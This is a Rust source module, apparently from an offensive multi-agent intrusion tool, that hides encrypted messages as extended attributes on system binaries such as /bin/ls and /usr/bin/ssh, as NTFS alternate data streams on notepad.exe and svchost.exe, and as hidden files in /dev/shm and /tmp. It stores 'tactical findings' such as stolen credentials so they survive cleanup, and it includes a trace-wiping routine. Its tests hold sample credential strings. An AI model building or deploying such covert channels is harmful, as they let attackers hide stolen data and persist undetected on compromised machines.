// Stigmergy: environment-based indirect communication.
// Agents leave encrypted "trails" on legit system files/bins that other agents
// read. No direct IPC needed — communication through the environment.
//
// Channels (by stealth level):
//   L1: Linux xattr on /bin/ls, /bin/ps, /usr/bin/ssh
//   L2: Windows NTFS ADS on notepad.exe, explorer.exe, svchost.exe
//   L3: /dev/shm/.hive_* files (fallback)
//   L4: ARP cache fake entries (last resort)
//
// All trail data is ChaCha20 encrypted with a colony-derived key.

use crate::crypto::{encrypt_chacha20, decrypt_chacha20, derive_key};
use tracing::info;

const XATTR_NAME: &str = "user.hive_trail";
const ADS_STREAM: &str = "hive_trail";
const TRAIL_SEED: &[u8] = b"STIGMERGY_COLONY_KEY_V2_X9kM3pQ";

// ── Linux xattr trails ────────────────────────────────────────────────

/// Leave an encrypted trail as an extended attribute on a legitimate system binary.
/// xattr is invisible to `ls -la`, not shown in normal file listings.
pub fn leave_trail_xattr(key: &str, value: &[u8]) -> bool {
    let targets = ["/bin/ls", "/bin/ps", "/usr/bin/ssh", "/bin/bash", "/usr/bin/python3"];
    let encrypted = encrypt_trail(value);

    for target in &targets {
        let c_key = std::ffi::CString::new(XATTR_NAME).unwrap();
        let c_path = std::ffi::CString::new(*target).unwrap();
        let c_val = encrypted.as_slice();

        unsafe {
            let ret = libc::setxattr(
                c_path.as_ptr(),
                c_key.as_ptr(),
                c_val.as_ptr() as *const libc::c_void,
                c_val.len(),
                0, // XATTR_CREATE = 1, but 0 (replace) is safer for re-writes
            );
            if ret == 0 {
                info!("STIGMERGY: xattr trail on {} ({} bytes)", target, c_val.len());
                return true;
            }
        }
    }
    // Fallback to file trails
    leave_trail_file(key, &encrypted)
}

/// Read encrypted trails from xattr on system binaries.
pub fn read_trails_xattr() -> Vec<(String, Vec<u8>)> {
    let targets = ["/bin/ls", "/bin/ps", "/usr/bin/ssh", "/bin/bash"];
    let mut trails = Vec::new();

    for target in &targets {
        let c_key = std::ffi::CString::new(XATTR_NAME).unwrap();
        let c_path = std::ffi::CString::new(*target).unwrap();

        // Get attribute size first
        let size = unsafe {
            libc::getxattr(c_path.as_ptr(), c_key.as_ptr(), std::ptr::null_mut(), 0)
        };
        if size <= 0 { continue; }

        let mut buf = vec![0u8; size as usize];
        let read = unsafe {
            libc::getxattr(c_path.as_ptr(), c_key.as_ptr(), buf.as_mut_ptr() as *mut libc::c_void, buf.len())
        };
        if read > 0 {
            buf.truncate(read as usize);
            if let Some(decrypted) = decrypt_trail(&buf) {
                trails.push((target.to_string(), decrypted));
            }
        }
    }
    trails
}

// ── Windows NTFS ADS trails ─────────────────────────────────────────────

/// Leave an encrypted trail as an NTFS Alternate Data Stream.
/// ADS is invisible in Explorer and normal `dir` output.
/// Only visible with `dir /r` or tools like streams.exe.
pub fn leave_trail_ads(key: &str, value: &[u8]) -> bool {
    // Windows NTFS ADS: write to legitimate binary with :stream_name
    let targets = [
        "C:\\Windows\\System32\\notepad.exe",
        "C:\\Windows\\explorer.exe",
        "C:\\Windows\\System32\\svchost.exe",
    ];
    let encrypted = encrypt_trail(value);

    for target in &targets {
        let ads_path = format!("{}:{}", target, ADS_STREAM);
        if let Ok(mut f) = std::fs::OpenOptions::new()
            .create(true).write(true).truncate(true).open(&ads_path)
        {
            use std::io::Write;
            if f.write_all(&encrypted).is_ok() {
                info!("STIGMERGY: ADS trail on {} ({} bytes)", ads_path, encrypted.len());
                return true;
            }
        }
    }
    false
}

/// Read encrypted trails from NTFS ADS.
pub fn read_trails_ads() -> Vec<(String, Vec<u8>)> {
    let targets = [
        "C:\\Windows\\System32\\notepad.exe",
        "C:\\Windows\\explorer.exe",
        "C:\\Windows\\System32\\svchost.exe",
    ];
    let mut trails = Vec::new();

    for target in &targets {
        let ads_path = format!("{}:{}", target, ADS_STREAM);
        if let Ok(data) = std::fs::read(&ads_path) {
            if let Some(decrypted) = decrypt_trail(&data) {
                trails.push((target.to_string(), decrypted));
            }
        }
    }
    trails
}

// ── File-based trails (fallback) ──────────────────────────────────────

/// Leave encrypted trail as a hidden file. Fallback when xattr/ADS unavailable.
pub fn leave_trail_file(key: &str, encrypted_data: &[u8]) -> bool {
    let paths = [
        format!("/dev/shm/.hive_{}", &key[..8.min(key.len())]),
        format!("/tmp/.hx_{}", &key[..8.min(key.len())]),
        format!("/var/tmp/.hs_{}", &key[..8.min(key.len())]),
    ];
    for path in &paths {
        if let Ok(mut f) = std::fs::OpenOptions::new()
            .create(true).write(true).truncate(true).open(path)
        {
            use std::io::Write;
            let _ = f.write_all(encrypted_data);
            let _ = f.sync_all();
            info!("STIGMERGY: file trail at {}", path);
            return true;
        }
    }
    false
}

/// Read all file-based encrypted trails.
pub fn read_trails_file() -> Vec<(String, Vec<u8>)> {
    let mut trails = Vec::new();
    for dir in &["/dev/shm", "/tmp", "/var/tmp"] {
        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                if name.starts_with(".hive_") || name.starts_with(".hx_") || name.starts_with(".hs_") {
                    if let Ok(data) = std::fs::read(&entry.path()) {
                        if data.len() < 10000 {
                            if let Some(decrypted) = decrypt_trail(&data) {
                                trails.push((entry.path().display().to_string(), decrypted));
                            }
                        }
                    }
                }
            }
        }
    }
    trails
}

// ── Unified API ────────────────────────────────────────────────────────

/// Leave a trail using the best available channel (xattr > file).
pub fn leave_trail(key: &str, value: &[u8]) {
    if !leave_trail_xattr(key, value) {
        let encrypted = encrypt_trail(value);
        leave_trail_file(key, &encrypted);
    }
}

/// Read all trails from all channels. Returns decrypted (key, value) pairs.
pub fn read_all_trails() -> Vec<(String, Vec<u8>)> {
    let mut all = Vec::new();
    all.extend(read_trails_xattr());
    all.extend(read_trails_file());
    all
}

/// Clean all trails across all channels.
pub fn clean_trails() {
    // Clean xattr (remove attribute from binaries)
    let targets = ["/bin/ls", "/bin/ps", "/usr/bin/ssh", "/bin/bash"];
    let c_key = std::ffi::CString::new(XATTR_NAME).unwrap();
    for target in &targets {
        let c_path = std::ffi::CString::new(*target).unwrap();
        unsafe { libc::removexattr(c_path.as_ptr(), c_key.as_ptr()); }
    }
    // Clean file trails
    for dir in &["/dev/shm", "/tmp", "/var/tmp"] {
        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                if name.starts_with(".hive_") || name.starts_with(".hx_") || name.starts_with(".hs_") {
                    let _ = std::fs::remove_file(entry.path());
                }
            }
        }
    }
    info!("STIGMERGY: all trails cleaned");
}

// ── Encryption helpers ─────────────────────────────────────────────────

fn encrypt_trail(data: &[u8]) -> Vec<u8> {
    let key = derive_key(std::str::from_utf8(TRAIL_SEED).unwrap_or("default"));
    encrypt_chacha20(data, &key)
}

fn decrypt_trail(encrypted: &[u8]) -> Option<Vec<u8>> {
    let key = derive_key(std::str::from_utf8(TRAIL_SEED).unwrap_or("default"));
    decrypt_chacha20(encrypted, &key)
}

// ── Drone integration helpers ──────────────────────────────────────────

/// On startup or after arena loss, recover tactical knowledge from trails.
/// Returns list of (description, value) pairs.
pub fn recover_knowledge() -> Vec<(String, String)> {
    let mut knowledge = Vec::new();
    for (source, data) in read_all_trails() {
        if let Ok(text) = String::from_utf8(data) {
            knowledge.push((source, text));
        }
    }
    info!("STIGMERGY: recovered {} knowledge items", knowledge.len());
    knowledge
}

/// Persist a tactical finding so it survives arena cleanup.
pub fn persist_finding(context: &str, data: &str) {
    let payload = format!("{}|{}", context, data);
    leave_trail(context, payload.as_bytes());
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_encrypt_decrypt_roundtrip() {
        let data = b"target:192.168.1.50,creds:admin:pass123";
        let encrypted = encrypt_trail(data);
        assert_ne!(encrypted, data, "Encrypted must differ from plaintext");
        let decrypted = decrypt_trail(&encrypted);
        assert_eq!(decrypted, Some(data.to_vec()));
    }

    #[test]
    fn test_encrypt_empty() {
        let encrypted = encrypt_trail(b"");
        let decrypted = decrypt_trail(&encrypted);
        assert_eq!(decrypted, Some(vec![]));
    }

    #[test]
    fn test_encrypt_large_payload() {
        let data = vec![0xAAu8; 4096];
        let encrypted = encrypt_trail(&data);
        let decrypted = decrypt_trail(&encrypted);
        assert_eq!(decrypted, Some(data));
    }

    #[test]
    fn test_decrypt_wrong_key_fails() {
        let data = b"sensitive intel";
        let encrypted = encrypt_trail(data);
        // Tamper with ciphertext
        let mut tampered = encrypted.clone();
        if !tampered.is_empty() { tampered[0] ^= 0xFF; }
        let result = decrypt_trail(&tampered);
        assert!(result.is_none() || result != Some(data.to_vec()));
    }

    #[test]
    fn test_file_trail_roundtrip() {
        let key = format!("test_{}", std::process::id());
        let encrypted = encrypt_trail(b"test payload");
        leave_trail_file(&key, &encrypted);
        let trails = read_trails_file();
        let found = trails.iter().any(|(_, data)| data == b"test payload");
        assert!(found, "Trail should be readable");
        clean_trails();
    }

    #[test]
    fn test_persist_and_recover() {
        persist_finding("creds", "root:hunter2");
        let knowledge = recover_knowledge();
        assert!(!knowledge.is_empty(), "Should recover persisted knowledge");
        clean_trails();
    }
}
